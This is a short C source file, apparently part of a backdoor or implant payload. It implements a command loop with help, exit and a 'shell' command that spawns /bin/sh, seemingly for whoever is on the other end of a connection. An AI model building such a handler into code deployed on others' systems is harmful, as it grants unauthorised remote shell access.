#include "payload.h"

static void print_help(void);
static int	handle_command(const char *command);

static int handle_command(const char *command) {
	if (strcmp(command, "exit") == 0) {
		return (1);
	}

	if (strcmp(command, "?") == 0 || strcmp(command, "help") == 0) {
		print_help();
		return (0);
	}

	if (strcmp(command, "shell") == 0 || strcmp(command, "sh") == 0) {
		if (execl("/bin/sh", "sh", NULL) == -1) {
			Errf("Failed to spawn shell: %s", strerror(errno));
		}
		return (0);
	}

	write(STDOUT_FILENO, "Unknown command\n", 16);

	return (0);
}

static void print_help(void) {
	const char *help =
		"Available commands:\n"
		"  help, ?  - Show this help message\n"
		"  shell,sh - Spawn a shell\n"
		"  exit     - Close connection\n";

	write(STDOUT_FILENO, help, strlen(help));
}

void repl(void) {
	char buffer[64];

	while (1) {
		write(STDOUT_FILENO, "$> ", 2);

		memset(buffer, 0, sizeof(buffer));

		if (read(STDIN_FILENO, buffer, sizeof(buffer) - 1) <= 0) {
			Debugf("breaking from repl on read: %s", strerror(errno));
			break;
		}

		buffer[strcspn(buffer, "\n")] = '\0';

		if (handle_command(buffer) == 1) {
			Debugf("breaking from repl on handle_comand: %s", strerror(errno));
			break;
		}
	}
}
